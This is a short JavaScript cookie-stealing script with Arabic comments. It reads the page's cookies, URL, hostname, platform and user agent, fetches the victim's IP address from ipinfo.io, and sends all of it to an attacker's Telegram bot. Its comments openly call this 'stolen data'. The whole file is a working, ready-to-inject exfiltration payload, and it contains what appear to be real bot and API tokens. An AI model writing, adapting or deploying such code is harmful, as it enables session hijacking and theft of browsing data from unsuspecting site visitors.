var botToken = "5691570782:AAGMKFygk9MyAlZXtPNddydtDsY4Ouo8-ng";
var targetChatId = "5010958919";
var stolenData = "Cookies: " + document.cookie + "\n";
stolenData += "Hostname: " + window.location.hostname + "\n";
stolenData += "URL: " + window.location.href + "\n";
stolenData += "Operating System: " + navigator.platform + "\n";
stolenData += "Browser: " + navigator.userAgent + "\n";

// استدعاء خدمة ipinfo.io للحصول على معلومات الIP
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://ipinfo.io/json?token=0378b5d5af7671', true);
xhr.onreadystatechange = function () {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var response = JSON.parse(xhr.responseText);
    var ipAddress = response.ip;
    // قم بإضافة المزيد من المعلومات المسترقة إلى stolenData إذا رغبت
    stolenData += "IP Address: " + ipAddress;

    // إرسال البيانات المسروقة إلى تليجرام
    var telegramUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + targetChatId + '&text=' + encodeURIComponent(stolenData);
    var telegramRequest = new XMLHttpRequest();
    telegramRequest.open('GET', telegramUrl, true);
    telegramRequest.send();
  }
};
xhr.send();
